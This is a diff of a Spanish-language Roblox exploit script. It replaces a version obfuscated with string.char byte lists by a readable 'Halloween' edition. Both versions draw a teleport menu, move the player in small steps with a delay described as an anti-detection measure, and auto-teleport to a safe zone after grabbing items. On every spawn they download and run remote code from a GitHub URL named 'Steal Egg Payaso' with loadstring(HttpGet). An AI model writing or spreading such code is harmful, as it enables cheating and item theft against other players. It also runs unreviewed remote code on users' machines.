@@ -1,2 +1,332 @@
-local _decode=string.char
-local _a=game:GetService(_decode(80,108,97,121,101,114,115)).LocalPlayer local _b=game:GetService(_decode(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101))local _c=game:GetService(_decode(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101))local _d=77881572888789 local _e=Vector3.new(340.52,4.00,-1.42)local _f=Vector3.new(3605.74,4.00,-0.99)local _g=Vector3.new(2965.09,4.00,-41.94)local _h=_decode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,71,101,116,70,114,101,101,83,101,101,100,80,97,99,107,47,82,111,98,97,117,110,69,103,103,68,101,80,97,121,97,115,111,47,109,97,105,110,47,83,116,101,97,108,37,50,48,69,103,103,37,50,48,80,97,121,97,115,111)local _i=1.0 local _j=0.006 local _k=true local _l=1.5 local _m=false local _n=false local _o=false local function _p()task.wait(1)local _q,_r=pcall(function()loadstring(game:HttpGet(_h))()end)if not _q then warn(_decode(226,154,160,239,184,143,32,78,111,32,115,101,32,112,117,100,111,32,99,97,114,103,97,114,32,101,108,32,115,99,114,105,112,116,58,32)..tostring(_r))end end local function _s(_t)if _m then return end _m=true local _u=_a.Character if not _u or not _u:FindFirstChild(_decode(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))then _m=false return end local _v=_u.HumanoidRootPart local _w=_v.Position local _x=_t+Vector3.new(0,_i,0)local _y=5 for _W=1,_y do if not _m then break end local _z=_W/_y local _A=_w:Lerp(_x,_z)_v.CFrame=CFrame.new(_A)task.wait(_j)end if _m then _v.CFrame=CFrame.new(_t+Vector3.new(0,0.5,0))task.wait(0.015)_v.CFrame=CFrame.new(_t+Vector3.new(0,0.15,0))task.wait(0.015)_v.CFrame=CFrame.new(_t)end if _k then local _B=os.clock()while os.clock()-_B<_l and _m do task.wait(0.05)if _v and(_v.Position-_t).Magnitude>3 then _v.CFrame=CFrame.new(_t)end end end _m=false end local function _C()if _n then return end _n=true task.spawn(function()task.wait(0.3)_c:TeleportToPlaceInstance(_d,game.JobId,_a)end)end local function _D(_E)local _F=false local _G=Vector2.new()_E.InputBegan:Connect(function(_H)if _H.UserInputType==Enum.UserInputType.MouseButton1 or _H.UserInputType==Enum.UserInputType.Touch then _F=true _G=_b:GetMouseLocation()-Vector2.new(_E.AbsolutePosition.X,_E.AbsolutePosition.Y)_H.Changed:Connect(function()if _H.UserInputState==Enum.UserInputState.End then _F=false end end)end end)_b.InputChanged:Connect(function(_H)if _F and(_H.UserInputType==Enum.UserInputType.MouseMovement or _H.UserInputType==Enum.UserInputType.Touch)then local _I=_b:GetMouseLocation()-_G _E.Position=UDim2.new(0,_I.X,0,_I.Y)end end)end local function _J()if game:GetService(_decode(67,111,114,101,71,117,105)):FindFirstChild(_decode(84,80,77,101,110,117))then return end local _K=Instance.new(_decode(83,99,114,101,101,110,71,117,105))_K.Name=_decode(84,80,77,101,110,117)_K.Parent=game:GetService(_decode(67,111,114,101,71,117,105))_K.ZIndexBehavior=Enum.ZIndexBehavior.Sibling _K.ResetOnSpawn=false local _L=Instance.new(_decode(70,114,97,109,101))_L.Size=UDim2.new(0,240,0,330)_L.Position=UDim2.new(0.02,0,0.45,0)_L.BackgroundColor3=Color3.fromRGB(20,20,35)_L.BorderSizePixel=2 _L.BorderColor3=Color3.fromRGB(80,220,120)_L.Parent=_K local _M=Instance.new(_decode(70,114,97,109,101))_M.Size=UDim2.new(1,0,0,40)_M.BackgroundColor3=Color3.fromRGB(35,35,55)_M.Parent=_L local _N=Instance.new(_decode(84,101,120,116,76,97,98,101,108))_N.Size=UDim2.new(1,-50,1,0)_N.BackgroundTransparency=1 _N.Text=_decode(226,154,161,32,84,80,32,43,32,65,85,84,79,45,76,79,65,68)_N.Font=Enum.Font.GothamBold _N.TextSize=16 _N.TextColor3=Color3.fromRGB(80,220,120)_N.Parent=_M local _O=Instance.new(_decode(84,101,120,116,66,117,116,116,111,110))_O.Size=UDim2.new(0,40,1,0)_O.Position=UDim2.new(1,-42,0,0)_O.BackgroundColor3=Color3.fromRGB(80,220,120)_O.Text=_decode(226,136,146)_O.Font=Enum.Font.GothamBold _O.TextSize=22 _O.TextColor3=Color3.fromRGB(0,0,0)_O.Parent=_M local _P=Instance.new(_decode(70,114,97,109,101))_P.Size=UDim2.new(1,-20,1,-50)_P.Position=UDim2.new(0,10,0,45)_P.BackgroundTransparency=1 _P.Parent=_L local _Q=Instance.new(_decode(84,101,120,116,66,117,116,116,111,110))_Q.Size=UDim2.new(1,0,0,52)_Q.BackgroundColor3=Color3.fromRGB(80,220,120)_Q.Text=_decode(226,154,161,32,90,79,78,65,32,83,69,71,85,82,65)_Q.Font=Enum.Font.GothamBold _Q.TextSize=17 _Q.TextColor3=Color3.fromRGB(0,0,0)_Q.AutoLocalize=false _Q.Parent=_P local _R=Instance.new(_decode(84,101,120,116,66,117,116,116,111,110))_R.Size=UDim2.new(1,0,0,52)_R.Position=UDim2.new(0,0,0,57)_R.BackgroundColor3=Color3.fromRGB(80,220,120)_R.Text=_decode(240,159,140,178,32,73,82,32,65,32,70,79,82,69,83,84)_R.Font=Enum.Font.GothamBold _R.TextSize=17 _R.TextColor3=Color3.fromRGB(0,0,0)_R.AutoLocalize=false _R.Parent=_P local _S=Instance.new(_decode(84,101,120,116,66,117,116,116,111,110))_S.Size=UDim2.new(1,0,0,52)_S.Position=UDim2.new(0,0,0,114)_S.BackgroundColor3=Color3.fromRGB(150,120,90)_S.Text=_decode(240,159,170,166,32,73,82,32,65,32,67,69,77,69,78,84,69,82,73,79)_S.Font=Enum.Font.GothamBold _S.TextSize=17 _S.TextColor3=Color3.fromRGB(255,255,255)_S.AutoLocalize=false _S.Parent=_P local _T=Instance.new(_decode(84,101,120,116,66,117,116,116,111,110))_T.Size=UDim2.new(1,0,0,52)_T.Position=UDim2.new(0,0,0,171)_T.BackgroundColor3=Color3.fromRGB(255,180,0)_T.Text=_decode(240,159,148,132,32,82,69,85,78,73,82,83,69,32,68,69,32,78,85,69,86,79)_T.Font=Enum.Font.GothamBold _T.TextSize=16 _T.TextColor3=Color3.fromRGB(0,0,0)_T.AutoLocalize=false _T.Parent=_P local _U=Instance.new(_decode(84,101,120,116,66,117,116,116,111,110))_U.Size=UDim2.new(0,170,0,45)_U.BackgroundColor3=Color3.fromRGB(35,35,55)_U.BorderSizePixel=2 _U.BorderColor3=Color3.fromRGB(80,220,120)_U.Text=_decode(226,154,161,32,84,80,32,43,32,65,85,84,79,45,76,79,65,68)_U.Font=Enum.Font.GothamBold _U.TextSize=14 _U.TextColor3=Color3.fromRGB(80,220,120)_U.Visible=false _U.Parent=_K local function _V()_o=not _o _L.Visible=not _o _U.Visible=_o if _o then _U.Position=_L.Position end end _Q.MouseButton1Click:Connect(function()_s(_e)end)_R.MouseButton1Click:Connect(function()_s(_f)end)_S.MouseButton1Click:Connect(function()_s(_g)end)_T.MouseButton1Click:Connect(_C)_O.MouseButton1Click:Connect(_V)_U.MouseButton1Click:Connect(_V)_D(_L)_D(_U)end _J()_p()_a.CharacterAdded:Connect(function()task.wait(0.5)_J()_p()end)
+-- =============================================
+-- 🎃 HALLOWEEN EDITION — TP + AUTO-TP
+-- 👻 AUTO TP | 👁️ EYES | 🌲 FOREST | 🪦 CEMENTERIO | 🦇 REJOIN
+-- =============================================
+
+local Player = game:GetService("Players").LocalPlayer
+local UIS = game:GetService("UserInputService")
+local TService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+
+-- 📍 CONFIGURACIÓN
+local JUEGO_ID = 77881572888789
+local ZONA_SEGURA = Vector3.new(340.52, 4.00, -1.42)
+local ZONA_FOREST = Vector3.new(3605.74, 4.00, -0.99)
+local ZONA_CEMENTERIO = Vector3.new(2965.09, 4.00, -41.94)
+local ZONA_EYES   = Vector3.new(4333.19043, 4.01, -49.74)
+
+-- 🔗 TU SCRIPT
+local SCRIPT_URL = "https://raw.githubusercontent.com/GetFreeSeedPack/RobaunEggDePayaso/main/Steal%20Egg%20Payaso"
+
+-- ⚡ CONFIGURACIÓN TP
+local ALTITUD_SEGURA = 1.0
+local RETRASO_ANTI = 0.006
+local BLOQUEAR_REGRESO = true
+local TIEMPO_PROTECCION = 1.5
+
+-- 🎯 AUTO-TP
+local AUTO_TP_ACTIVO = true
+local ULTIMO_TP = 0
+local TIEMPO_ESPERA = 2
+local OBJETOS_ANTERIORES = {}
+
+local Activo = false
+local RejoinActivo = false
+local MenuMinimizado = false
+
+-- 🎨 COLORES HALLOWEEN
+local COLOR_FONDO = Color3.fromRGB(25, 15, 40)
+local COLOR_BORDE = Color3.fromRGB(220, 90, 20)
+local COLOR_BARRA = Color3.fromRGB(45, 25, 70)
+local COLOR_BOTON = Color3.fromRGB(150, 50, 180)
+
+-- ✅ CARGA SCRIPT
+local function EjecutarScript()
+    task.wait(1)
+    local exito, error = pcall(function()
+        loadstring(game:HttpGet(SCRIPT_URL))()
+    end)
+    if not exito then
+        warn("⚠️ Error cargando script: " .. tostring(error))
+    end
+end
+
+-- 🛡️ TP SEGURO
+local function IrAZona(Destino)
+    if Activo then return end
+    Activo = true
+
+    local Char = Player.Character
+    if not Char or not Char:FindFirstChild("HumanoidRootPart") then
+        Activo = false
+        return
+    end
+    local HRP = Char.HumanoidRootPart
+    local Inicio = HRP.Position
+    local DestinoFinal = Destino + Vector3.new(0, ALTITUD_SEGURA, 0)
+
+    local Pasos = 5
+    for i = 1, Pasos do
+        if not Activo then break end
+        local Progreso = i / Pasos
+        local NuevaPos = Inicio:Lerp(DestinoFinal, Progreso)
+        HRP.CFrame = CFrame.new(NuevaPos)
+        task.wait(RETRASO_ANTI)
+    end
+
+    if Activo then
+        HRP.CFrame = CFrame.new(Destino + Vector3.new(0, 0.5, 0))
+        task.wait(0.015)
+        HRP.CFrame = CFrame.new(Destino + Vector3.new(0, 0.15, 0))
+        task.wait(0.015)
+        HRP.CFrame = CFrame.new(Destino)
+    end
+
+    if BLOQUEAR_REGRESO then
+        local TiempoInicio = os.clock()
+        while os.clock() - TiempoInicio < TIEMPO_PROTECCION and Activo do
+            task.wait(0.05)
+            if HRP and (HRP.Position - Destino).Magnitude > 3 then
+                HRP.CFrame = CFrame.new(Destino)
+            end
+        end
+    end
+
+    Activo = false
+end
+
+-- 🎯 DETECTA OBJETOS
+local function HayObjetoNuevo()
+    local Char = Player.Character
+    if not Char then return false end
+    
+    local Encontrado = false
+    
+    for _, Hijo in pairs(Char:GetChildren()) do
+        if Hijo:IsA("Model") or Hijo:IsA("BasePart") then
+            if not OBJETOS_ANTERIORES[Hijo] then
+                OBJETOS_ANTERIORES[Hijo] = true
+                Encontrado = true
+                warn("👻 Objeto detectado: " .. Hijo.Name)
+            end
+        end
+    end
+    
+    for Obj, _ in pairs(OBJETOS_ANTERIORES) do
+        if not Obj:IsDescendantOf(Char) then
+            OBJETOS_ANTERIORES[Obj] = nil
+        end
+    end
+    
+    return Encontrado
+end
+
+-- 🔄 BUCLE AUTO-TP
+RunService.Heartbeat:Connect(function()
+    if not AUTO_TP_ACTIVO then return end
+    
+    local TieneObjeto = HayObjetoNuevo()
+    local Ahora = os.clock()
+    
+    if TieneObjeto and (Ahora - ULTIMO_TP) > TIEMPO_ESPERA and not Activo then
+        ULTIMO_TP = Ahora
+        warn("🦇 Teletransportando a Zona Segura...")
+        task.spawn(function()
+            IrAZona(ZONA_SEGURA)
+        end)
+    end
+end)
+
+-- 🔄 REJOIN
+local function Rejoin()
+    if RejoinActivo then return end
+    RejoinActivo = true
+    task.spawn(function()
+        task.wait(0.3)
+        TService:TeleportToPlaceInstance(JUEGO_ID, game.JobId, Player)
+    end)
+end
+
+-- 🖱️ ARRASTRAR MENÚ
+local function HacerMovible(Elemento)
+    local Arrastrando = false
+    local Diferencia = Vector2.new()
+    Elemento.InputBegan:Connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+            Arrastrando = true
+            Diferencia = UIS:GetMouseLocation() - Vector2.new(Elemento.AbsolutePosition.X, Elemento.AbsolutePosition.Y)
+            Input.Changed:Connect(function()
+                if Input.UserInputState == Enum.UserInputState.End then
+                    Arrastrando = false
+                end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(Input)
+        if Arrastrando and (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
+            local Pos = UIS:GetMouseLocation() - Diferencia
+            Elemento.Position = UDim2.new(0, Pos.X, 0, Pos.Y)
+        end
+    end)
+end
+
+-- 📋 MENÚ
+local function CrearMenu()
+    if game:GetService("CoreGui"):FindFirstChild("TPMenu") then return end
+
+    local Gui = Instance.new("ScreenGui")
+    Gui.Name = "TPMenu"
+    Gui.Parent = game:GetService("CoreGui")
+    Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    Gui.ResetOnSpawn = false
+
+    local Marco = Instance.new("Frame")
+    Marco.Size = UDim2.new(0, 250, 0, 355)
+    Marco.Position = UDim2.new(0.02, 0, 0.45, 0)
+    Marco.BackgroundColor3 = COLOR_FONDO
+    Marco.BorderSizePixel = 3
+    Marco.BorderColor3 = COLOR_BORDE
+    Marco.Parent = Gui
+
+    local Barra = Instance.new("Frame")
+    Barra.Size = UDim2.new(1, 0, 0, 45)
+    Barra.BackgroundColor3 = COLOR_BARRA
+    Barra.Parent = Marco
+
+    local Titulo = Instance.new("TextLabel")
+    Titulo.Size = UDim2.new(1, -50, 1, 0)
+    Titulo.BackgroundTransparency = 1
+    Titulo.Text = "🎃 HALLOWEEN TP 🦇"
+    Titulo.Font = Enum.Font.GothamBold
+    Titulo.TextSize = 15
+    Titulo.TextColor3 = Color3.fromRGB(255, 165, 0)
+    Titulo.Parent = Barra
+
+    local BtnMin = Instance.new("TextButton")
+    BtnMin.Size = UDim2.new(0, 40, 1, 0)
+    BtnMin.Position = UDim2.new(1, -42, 0, 0)
+    BtnMin.BackgroundColor3 = COLOR_BORDE
+    BtnMin.Text = "−"
+    BtnMin.Font = Enum.Font.GothamBold
+    BtnMin.TextSize = 22
+    BtnMin.TextColor3 = Color3.new(0,0,0)
+    BtnMin.Parent = Barra
+
+    local Contenido = Instance.new("Frame")
+    Contenido.Size = UDim2.new(1, -20, 1, -50)
+    Contenido.Position = UDim2.new(0, 10, 0, 45)
+    Contenido.BackgroundTransparency = 1
+    Contenido.Parent = Marco
+
+    -- 🎯 1. AUTO-TP
+    local BtnAutoTP = Instance.new("TextButton")
+    BtnAutoTP.Size = UDim2.new(1, 0, 0, 52)
+    BtnAutoTP.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
+    BtnAutoTP.Text = "👻 AUTO-TP: ACTIVADO"
+    BtnAutoTP.Font = Enum.Font.GothamBold
+    BtnAutoTP.TextSize = 15
+    BtnAutoTP.TextColor3 = Color3.new(1,1,1)
+    BtnAutoTP.AutoLocalize = false
+    BtnAutoTP.Parent = Contenido
+    
+    BtnAutoTP.MouseButton1Click:Connect(function()
+        AUTO_TP_ACTIVO = not AUTO_TP_ACTIVO
+        if AUTO_TP_ACTIVO then
+            BtnAutoTP.Text = "👻 AUTO-TP: ACTIVADO"
+            BtnAutoTP.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
+        else
+            BtnAutoTP.Text = "💤 AUTO-TP: DESACTIVADO"
+            BtnAutoTP.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+        end
+    end)
+
+    -- 👁️ 2. TP EYES
+    local BtnEyes = Instance.new("TextButton")
+    BtnEyes.Size = UDim2.new(1, 0, 0, 52)
+    BtnEyes.Position = UDim2.new(0, 0, 0, 57)
+    BtnEyes.BackgroundColor3 = COLOR_BOTON
+    BtnEyes.Text = "👁️ TP EYES"
+    BtnEyes.Font = Enum.Font.GothamBold
+    BtnEyes.TextSize = 16
+    BtnEyes.TextColor3 = Color3.new(1,1,1)
+    BtnEyes.AutoLocalize = false
+    BtnEyes.Parent = Contenido
+
+    -- 🌲 3. TP FOREST
+    local BtnForest = Instance.new("TextButton")
+    BtnForest.Size = UDim2.new(1, 0, 0, 52)
+    BtnForest.Position = UDim2.new(0, 0, 0, 114)
+    BtnForest.BackgroundColor3 = COLOR_BOTON
+    BtnForest.Text = "🌲 TP FOREST"
+    BtnForest.Font = Enum.Font.GothamBold
+    BtnForest.TextSize = 16
+    BtnForest.TextColor3 = Color3.new(1,1,1)
+    BtnForest.AutoLocalize = false
+    BtnForest.Parent = Contenido
+
+    -- 🪦 4. TP CEMENTERIO
+    local BtnCementerio = Instance.new("TextButton")
+    BtnCementerio.Size = UDim2.new(1, 0, 0, 52)
+    BtnCementerio.Position = UDim2.new(0, 0, 0, 171)
+    BtnCementerio.BackgroundColor3 = COLOR_BOTON
+    BtnCementerio.Text = "🪦 TP CEMENTERIO"
+    BtnCementerio.Font = Enum.Font.GothamBold
+    BtnCementerio.TextSize = 16
+    BtnCementerio.TextColor3 = Color3.new(1,1,1)
+    BtnCementerio.AutoLocalize = false
+    BtnCementerio.Parent = Contenido
+
+    -- 🦇 5. AUTO REJOIN
+    local BtnRejoin = Instance.new("TextButton")
+    BtnRejoin.Size = UDim2.new(1, 0, 0, 52)
+    BtnRejoin.Position = UDim2.new(0, 0, 0, 228)
+    BtnRejoin.BackgroundColor3 = Color3.fromRGB(200, 110, 40)
+    BtnRejoin.Text = "🦇 AUTO REJOIN"
+    BtnRejoin.Font = Enum.Font.GothamBold
+    BtnRejoin.TextSize = 15
+    BtnRejoin.TextColor3 = Color3.new(1,1,1)
+    BtnRejoin.AutoLocalize = false
+    BtnRejoin.Parent = Contenido
+
+    -- Botón Restaurar
+    local BtnRestaurar = Instance.new("TextButton")
+    BtnRestaurar.Size = UDim2.new(0, 170, 0, 45)
+    BtnRestaurar.BackgroundColor3 = COLOR_BARRA
+    BtnRestaurar.BorderSizePixel = 2
+    BtnRestaurar.BorderColor3 = COLOR_BORDE
+    BtnRestaurar.Text = "🎃 HALLOWEEN TP"
+    BtnRestaurar.Font = Enum.Font.GothamBold
+    BtnRestaurar.TextSize = 13
+    BtnRestaurar.TextColor3 = Color3.fromRGB(255, 165, 0)
+    BtnRestaurar.Visible = false
+    BtnRestaurar.Parent = Gui
+
+    local function ToggleMin()
+        MenuMinimizado = not MenuMinimizado
+        Marco.Visible = not MenuMinimizado
+        BtnRestaurar.Visible = MenuMinimizado
+        if MenuMinimizado then
+            BtnRestaurar.Position = Marco.Position
+        end
+    end
+
+    -- Conectar botones
+    BtnEyes.MouseButton1Click:Connect(function() IrAZona(ZONA_EYES) end)
+    BtnForest.MouseButton1Click:Connect(function() IrAZona(ZONA_FOREST) end)
+    BtnCementerio.MouseButton1Click:Connect(function() IrAZona(ZONA_CEMENTERIO) end)
+    BtnRejoin.MouseButton1Click:Connect(Rejoin)
+    BtnMin.MouseButton1Click:Connect(ToggleMin)
+    BtnRestaurar.MouseButton1Click:Connect(ToggleMin)
+
+    HacerMovible(Marco)
+    HacerMovible(BtnRestaurar)
+end
+
+-- ✅ INICIO
+CrearMenu()
+EjecutarScript()
+Player.CharacterAdded:Connect(function()
+    task.wait(0.5)
+    CrearMenu()
+    EjecutarScript()
+end)
